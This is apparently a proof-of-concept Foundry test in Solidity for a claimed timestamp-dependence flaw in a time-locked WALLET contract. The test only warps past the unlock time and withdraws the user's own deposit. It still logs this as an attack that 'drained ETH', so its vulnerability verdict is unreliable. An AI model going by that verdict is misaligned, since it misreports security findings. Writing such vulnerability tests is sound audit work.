// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xcead721ef5b11f1a7b530171aab69b16c5e66b6e.sol";

contract TimestampDependenceTest is Test {
    WALLET public wallet;
    Log public logContract;
    address public user = makeAddr("user");
    uint256 public constant DEPOSIT_AMOUNT = 1 ether;
    uint256 public constant WAIT_PERIOD = 1 hours;
    uint256 public startTime;

    function setUp() public {
        // Deploy Log and WALLET contracts
        logContract = new Log();
        wallet = new WALLET(address(logContract));
        
        // Fund user and set start time
        vm.deal(user, DEPOSIT_AMOUNT);
        startTime = block.timestamp;
    }

    function test_MinersCanManipulateTimestamps() public {
        // User deposits funds with unlock time
        uint256 unlockTime = startTime + WAIT_PERIOD;
        vm.prank(user);
        wallet.Put{value: DEPOSIT_AMOUNT}(unlockTime);
        
        // Store initial balances
        uint256 initialWalletBalance = address(wallet).balance;
        uint256 initialUserBalance = user.balance;
        
        // Ensure deposit was successful
        assertEq(initialWalletBalance, DEPOSIT_AMOUNT, "Incorrect deposit amount");
        assertEq(initialUserBalance, 0, "User balance should be zero after deposit");

        // Attempt to collect too early (59 minutes)
        vm.warp(startTime + 59 minutes);
        vm.prank(user);
        wallet.Collect(DEPOSIT_AMOUNT);
        
        // Verify early withdrawal fails
        assertEq(address(wallet).balance, initialWalletBalance, "Funds moved too early");
        assertEq(user.balance, initialUserBalance, "User received funds too early");

        // Wait until after unlock time (61 minutes) to simulate malicious timestamp
        vm.warp(startTime + 61 minutes);
        
        // Capture state BEFORE attack
        console.log("--- BEFORE-Trigger Collect ---");
        uint256 walletBalanceBefore = address(wallet).balance;
        uint256 userBalanceBefore = user.balance;
        console.log("Contract ETH balance before Collect:", walletBalanceBefore);
        console.log("User ETH balance before Collect:", userBalanceBefore);

        // Critical attack action
        console.log("--- Trigger Collect ---");
        vm.prank(user);
        wallet.Collect(DEPOSIT_AMOUNT);
        
        // Capture state AFTER attack
        console.log("--- AFTER-Trigger Collect ---");
        uint256 walletBalanceAfter = address(wallet).balance;
        uint256 userBalanceAfter = user.balance;
        console.log("Contract ETH balance after Collect:", walletBalanceAfter);
        console.log("User ETH balance after Collect:", userBalanceAfter);

        // Calculate balance changes
        uint256 walletChange = walletBalanceBefore - walletBalanceAfter;
        uint256 userChange = userBalanceAfter - userBalanceBefore;
        console.log("Contract balance change:", walletChange);
        console.log("User balance change:", userChange);

        bool exploitationSuccess = false;
        if (walletChange == DEPOSIT_AMOUNT && userChange == DEPOSIT_AMOUNT) {
            exploitationSuccess = true;
            console.log("SUCCESS: Block timestamp manipulation enables early withdrawal");
        } else {
            console.log("FAILED: Balances didn't change as expected");
        }
        
        // Final vulnerability verdict
        if (exploitationSuccess) {
            console.log("Vulnerability Exists: Successfully drained ETH w/timestamp manipulation");
        } else {
            console.log("Vulnerability not Exist: Timestamp manipulation didn't affect balances");
        }

        // Verify successful withdrawal
        assertEq(address(wallet).balance, 0, "Funds not moved after unlock");
        assertEq(user.balance, DEPOSIT_AMOUNT, "User didn't receive funds");
    }
}